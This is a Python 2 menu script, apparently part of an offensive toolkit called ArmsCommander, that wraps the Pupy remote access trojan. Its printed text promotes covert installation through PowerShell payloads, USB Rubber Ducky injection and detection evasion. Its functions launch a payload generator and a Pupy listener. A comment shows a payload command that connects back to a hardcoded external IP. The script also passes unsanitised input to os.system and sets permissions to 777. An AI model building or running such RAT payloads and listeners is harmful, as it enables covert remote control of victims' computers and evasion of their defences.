#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

print 'I was searching for alternative RATs (Remote Access Trojans) and I liked Pupy so much the first time I tried it, I decided to add it to AC'
print 'Pupy has the capability to generate a standalone executable payload for the Windows PE32 format'
print 'As well as the newest, "State of the Art" Powershell-Payload Trend, enabling you to avoid detection and covertly install a Pupy Python Payload, remotely'
print 'To my surprise, it also has compatibility with the USB Rubber Ducky, and can auto-generate the injection binary'
print 'However syntax-wise, its difficult for most people that are not familiar with Python (or option-parsing) to understand'
print '\n\nI made this to make it as easy as pressing a few buttons'
print '\n\nSimply by using a payload that is not based on Metasploit, you already have a huge advantage in evading detection'
print '\nMeanwhile Pupy Server commands are very similar to Meterpreter and Command Shells'
print 'Plus, you can still have it interface with Metasploit if you wish'
# FIXED, by moving the contents of /root/ArmsCommander/pupy/pupy to /root/ArmsCommander
# type cp -r (while in directory) ./* /root/ArmsCommander (second pupy directory tree)
# need to know this for the installer wizard

#Be forewarned, by default the Pupy installers creates two directories /pupy/pupy, they must be removed and the contents moved to
# moved to the ROOT directory of the ArmsCommander installation, or else there will be a ton of "file not found issues"

# Apparently, you need both the /pupy/pupy directory and the /root/ArmsCommander/Pupy Folder
# Strange.
# Since I already have the full working install I might as well just release that? But the user still requires the modules


# The original Pupy repo has some sort of hash checksum checker too
# def install_pupy():
#     # print 'Due to various bugs I have encountered, I have decided to release a pre-installed version of Pupy with this version of Arms Commander'
#     # print 'The code is a bit modified so I can allow it to interact with a "point-and-click keyboard menu"'
#     # print 'But if you have any issues such as dependency problems, by all means type CONTINUE to have any required Python modules installed'
#
#     continue_Question = str(raw_input("Type CONTINUE (all caps) to install REQUIRED Pupy Modules: "))
#
#     if continue_Question == "CONTINUE":
#         print 'Your version of Pupy is up-to-date'
#         print 'Installing any required modules'
#         os.system('pip install -r /root/ArmsCommander/pupy/requirements.txt')
#         print 'Cloning Git Repo'
#         os.system('git clone https://github.com/n1nj4sec/pupy.git pupy')
#         os.system('cd pupy')
#         print 'Initializing submodules and updating them'
#         os.system('git submodule init')
#         os.system('git submodule update')
#         print 'Installing required pip modules'
#         os.system('pip install -r requirements.txt')
#         print 'Copying critical files to your ArmsCommander Installation'
#         os.system('cp -r ./* /root/ArmsCommander')
#         print 'Installation Complete. Run Pupy either from this menu, or from AC, #8 "Remote Exploitation" and then #6 "Pupy"'
#         main()
#         os.system('chmod 777 /root/ArmsCommander/crypto/gen.sh')
#         os.system('/root/ArmsCommander/crypto/gen.sh')
#         print 'Python module installation complete'
#         main()
#     else:
#         print 'Quitting Pupy autoinstaller'
#         main()
#     return

def generate_pupy_payload():
    # python pupygen.py -f exe_x86 connect --host 52.53.180.45:443
    os.system('python /root/ArmsCommander/Pupy_Payload_Generator.py')
    return

def server_pupy():
    opt_List = [
        '#0. Return to Main Menu',
        '#1. Use the pre-generated Pupy-Server Startup Script (Created when you made your payload)',
        '#2. Use a custom Pupy-Server Startup'
    ]

    print ("\n\t".join(opt_List))

    opt_Choice = str(raw_input("Enter a OPTION: "))

    if opt_Choice == "0":
        main()
    elif opt_Choice == "1":
        os.system('sudo chmod 777 /root/ArmsCommander')
        os.system('sudo /root/ArmsCommander/pupy_server_startup.sh')
    elif opt_Choice == "2":
        server_pupy_transport = str(raw_input("Enter your TRANSPORT (Protocol): "))
        server_pupy_port = str(raw_input("Enter your PORT: "))
        cmd_String = "python /root/pupy/pupy/pupysh.py -t %s -p %s" % (server_pupy_transport, server_pupy_port)
        print cmd_String
        os.system(cmd_String)
    else:
        print colored('You have entered a invalid option','red','on_white')
        server_pupy()
    return

def main():
    opt_List = [
        '\n\t#1. Run Pupy Payload Generator',
        '#2. Run Pupy Listener/Server'
    ]

    print ("\n\t".join(opt_List))
    opt_Choice = str(raw_input(""))

    if opt_Choice == "1":
        os.system('clear')
        generate_pupy_payload()
    elif opt_Choice == "2":
        os.system('clear')
        server_pupy()
    else:
        print colored('You have entered a invalid option','red','on_white')
        main()
main()
